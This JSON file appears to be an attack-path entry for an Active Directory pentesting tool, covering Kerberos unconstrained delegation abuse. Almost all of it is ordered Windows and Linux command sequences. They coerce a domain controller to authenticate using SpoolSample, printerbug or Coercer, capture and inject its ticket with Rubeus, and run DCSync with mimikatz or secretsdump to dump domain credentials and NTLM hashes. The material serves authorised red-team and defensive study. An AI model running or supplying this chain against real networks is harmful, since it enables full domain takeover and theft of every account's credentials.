{
    "CoerceToTGT": {
        "meaning": "The computer/user account is configured with Kerberos unconstrained delegation. If a computer or service account is trusted for unconstrained delegation, principals send their full Kerberos Ticket Granting Ticket (TGT) which can be forwarded, allowing the service host to impersonate the principal across other services. An attacker can coerce a Tier Zero computer (e.g. DC) to authenticate against the account and obtain the target's TGT.",
        "common": "",
        "windows": {
            "PrintSpooler_Coercion": [
                {
                    "order": 1,
                    "command": "Rubeus.exe monitor /user:dc.domain.com /interval:5 /nowrap",
                    "description": "Start monitoring for incoming TGTs on compromised computer with unconstrained delegation"
                },
                {
                    "order": 2,
                    "command": "SpoolSample.exe dc.domain.com compromised.domain.com",
                    "description": "Coerce target DC to authenticate to compromised computer using printspooler"
                },
                {
                    "order": 3,
                    "command": "Rubeus.exe ptt /ticket:doIFvjCCBbqgAwI...",
                    "description": "Inject captured DC TGT into memory for impersonation"
                },
                {
                    "order": 4,
                    "command": "lsadump::dcsync /domain:domain.com /user:DOMAIN\\targetuser",
                    "description": "Perform DCSync attack using injected DC TGT to dump credentials"
                }
            ],
            "Alternative_Coercion": [
                {
                    "order": 1,
                    "command": "Rubeus.exe monitor /user:target-dc.domain.com /interval:5 /nowrap",
                    "description": "Monitor for TGTs from target domain controller"
                },
                {
                    "order": 2,
                    "command": "# Use alternative coercion techniques like MS-RPRN, MS-EFSRPC, etc.",
                    "description": "Execute various Windows coerced authentication methods"
                },
                {
                    "order": 3,
                    "command": "Rubeus.exe ptt /ticket:BASE64_TGT_BLOB",
                    "description": "Import captured TGT for privilege escalation"
                }
            ],
            "Protected_Users_Check": [
                {
                    "order": 1,
                    "command": "# Query protected users to verify attack feasibility",
                    "description": "Check if target is member of Protected Users group or marked sensitive"
                },
                {
                    "order": 2,
                    "command": "Get-ADUser -Identity targetuser -Properties MemberOf | Select -ExpandProperty MemberOf",
                    "description": "Verify target user group memberships for protection status"
                }
            ]
        },
        "linux": {
            "Impacket_Coercion": [
                {
                    "order": 1,
                    "command": "# Setup Rubeus monitoring on Windows host with unconstrained delegation",
                    "description": "Prepare TGT monitoring on compromised Windows system"
                },
                {
                    "order": 2,
                    "command": "printerbug.py 'domain/user:password'@TARGET_DC_IP COMPROMISED_COMPUTER_IP",
                    "description": "Coerce domain controller authentication using printerbug from Linux"
                },
                {
                    "order": 3,
                    "command": "echo 'doIFvjCCBbqgAwI...' | base64 -d | tee ticket.kirbi > /dev/null",
                    "description": "Save captured TGT base64 blob as kirbi file"
                },
                {
                    "order": 4,
                    "command": "ticketConverter.py ticket.kirbi ticket.ccache",
                    "description": "Convert TGT from kirbi to ccache format for Linux use"
                },
                {
                    "order": 5,
                    "command": "export KRB5CCNAME=$PWD/ticket.ccache",
                    "description": "Set Kerberos credential cache environment variable"
                },
                {
                    "order": 6,
                    "command": "secretsdump.py -k -just-dc-user DOMAIN/targetuser TARGET_DC.domain.com",
                    "description": "Perform DCSync using captured DC TGT to extract credentials"
                }
            ],
            "Alternative_Tools": [
                {
                    "order": 1,
                    "command": "python3 krbrelayx/printerbug.py domain/user:password@dc.domain.com compromised.domain.com",
                    "description": "Use krbrelayx printerbug for coercion from Linux"
                },
                {
                    "order": 2,
                    "command": "python3 coercer.py -t TARGET_DC_IP -l LISTENER_IP -u USER -p PASSWORD",
                    "description": "Use Coercer tool for various authentication coercion methods"
                },
                {
                    "order": 3,
                    "command": "getTGT.py domain/user:password",
                    "description": "Alternative method to obtain TGT if coercion successful"
                }
            ],
            "Manual_DCSync": [
                {
                    "order": 1,
                    "command": "# Ensure TGT is properly imported and KRB5CCNAME is set",
                    "description": "Verify Kerberos authentication setup for DCSync"
                },
                {
                    "order": 2,
                    "command": "secretsdump.py -k -just-dc domain.com/targetuser@dc.domain.com",
                    "description": "Extract domain credentials using captured DC TGT"
                },
                {
                    "order": 3,
                    "command": "secretsdump.py -k -just-dc-ntlm domain.com/targetuser@dc.domain.com",
                    "description": "Extract NTLM hashes specifically using DCSync"
                }
            ]
        }
    }
}
